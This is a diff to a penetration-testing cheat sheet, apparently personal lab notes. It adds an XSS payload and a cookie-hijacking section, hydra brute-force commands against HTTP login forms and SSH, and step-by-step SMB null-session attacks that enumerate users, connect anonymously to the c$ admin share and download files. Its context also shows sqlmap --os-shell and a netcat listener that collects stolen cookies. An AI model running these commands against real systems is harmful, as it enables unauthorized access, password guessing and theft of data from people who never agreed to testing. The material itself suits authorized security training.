@@ -144,6 +144,13 @@ sqlmap -u http://10.10.10.15/?id=4 --os-shell
 ```
 
 ### xss
+
+check example:
+```javascript
+<script>alert("hack :)")</script>
+```
+
+#### hijack cookie through xss
 there are four components as follows:
 - attacker client pc
 - attacker logging server
@@ -168,34 +175,33 @@ nc -vv -k -l -p 80
 5) attacker: after obtaining the victim's cookie, utilize a firefox's add-on called Cookie Quick Manager to change to the victim's cookie in an effort to hijack the victim's privilege.
 
 
-
 ### bruteforce (hydra, john, hashcat)
 wordlist generation
 ```bash
 cewl example.com -m 3 -w wordlist.txt
 ```
 
-http basic auth brute
+hydra http basic auth brute
 ```bash
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-head /admin/
 ```
 
-http digest
+hydra brute http digest
 ```bash
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-get /admin/
 ```
 
-http post form
+hydra brute http post form
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed"
 ```
 
-http authenticated post form
+hydra brute http authenticated post form
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed:H=Cookie\: PHPSESSID=if0kg4ss785kmov8bqlbusva3v"
 ```
 
-brute
+hydra brute
 ```bash
 hydra -f -v -V -L users.txt -P rockyou-15.txt -s 2223 -f ssh://10.10.10.17
 hydra -v -V -l admin -P rockyou-10.txt ssh://10.10.10.18
@@ -306,12 +312,54 @@ use post/windows/gather/hashdump
 ```
 
 ### windows shares with null sessions
+
+enumeration with kali/parrot tools:
 ```
 nmblookup -A 10.16.64.223
 smbclient -L //10.16.64.223 -N share
 smbclient //10.16.64.223/share -N mount
 
 enum4linux -a 10.10.10.13
+```
+
+enumeration with nmap:
+```bash
+ll /usr/share/nmap/scripts/ | grep smb-enum-
+-rw-r--r-- 1 root root  4846 Jan  9  2019 smb-enum-domains.nse
+-rw-r--r-- 1 root root  5931 Jan  9  2019 smb-enum-groups.nse
+-rw-r--r-- 1 root root  8045 Jan  9  2019 smb-enum-processes.nse
+-rw-r--r-- 1 root root 27262 Jan  9  2019 smb-enum-services.nse
+-rw-r--r-- 1 root root 12057 Jan  9  2019 smb-enum-sessions.nse
+-rw-r--r-- 1 root root  6923 Jan  9  2019 smb-enum-shares.nse
+-rw-r--r-- 1 root root 12531 Jan  9  2019 smb-enum-users.nse
+
+nmap --script=smb-enum-users 192.168.1.10
+```
+
+#### null sessions
+1) Use "enum4linux -n" to make sure if "<20>" exists:
+```bash
+enum4linux -n 192.168.1.10
+```
+
+2) If "<20>" exists, it means Null Session could be exploited. Utilize the following command to get more details:
+```bash
+enum4linux 192.168.1.10
+```
+
+3) If confirmed that Null Session exists, you can remotely list all share of the target:
+```bash
+smbclient -L WORKGROUP -I 192.168.1.10 -N -U ""
+```
+
+4) You also can connect the remote server by applying the following command:
+```bash
+smbclient \\\\192.168.1.10\\c$ -N -U ""
+```
+
+5) Download those files stored on the share drive:
+```bash
+smb: \> get Congratulations.txt
 ```
 
 ### ARP spoofing
